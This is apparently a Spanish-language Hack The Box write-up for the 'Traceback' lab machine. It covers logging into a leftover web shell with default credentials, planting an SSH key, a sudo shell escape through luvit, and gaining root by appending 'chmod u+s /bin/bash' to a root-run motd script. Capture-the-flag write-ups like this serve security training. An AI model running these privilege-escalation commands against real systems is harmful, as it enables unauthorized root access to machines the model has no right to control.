# Traceback ![Avatar](https://www.hackthebox.eu/storage/avatars/c1a1199f831c50fdb1895737b009278b_thumb.png)

## Initial Scan
```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Help us
```
## Enum
### HTTP
Han hecho un deface de la pagina, y mirando en el source encontramos lo siguiente
```
		<!--Some of the best web shells that you might need ;)-->
```
Si buscamos esa frase encontraremos un repo con la misma
```
https://github.com/TheBinitGhimire/Web-Shells
```
Probemos con los nombres de archivo de las shells, finalmente en smevk.php encontramos un menú de login, las creds de esta shell son las siguientes
```
admin:admin
```
Podemos añadir una clave nueva a authorized_keys en el siguiente directorio
```
/home/webadmin/.ssh/
``` 

## Privesc
Como webadmin podemos ejecutar luvit en el servidor
```
User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
```
Ejecutamos lo siguiente
```
sudo -u sysadmin  /home/sysadmin/luvit -e 'os.execute("/bin/bash")'
```
Y ya tenemos shell como sysadmin

Usando ps aux vemos lo siguiente
```
root       2054  0.0  0.0   4628   808 ?        Ss   08:46   0:00 /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
```
La segunda carpeta es curiosamente nuestra , y resulta que el SSH se ejecuta como root, es decir 00-header se ejecuta como root y podemos escribir en el, buenisima combinacion
```
echo 'chmod u+s /bin/bash' >> 00-header 
```
Tras esto corremos a logearnos (tenemos como mucho 30seg antes de repetir el comando)

Y tras esto tenemos un bonito SUID en bash como root
```
/bin/bash -p
```
Y ya tenemos shell como root
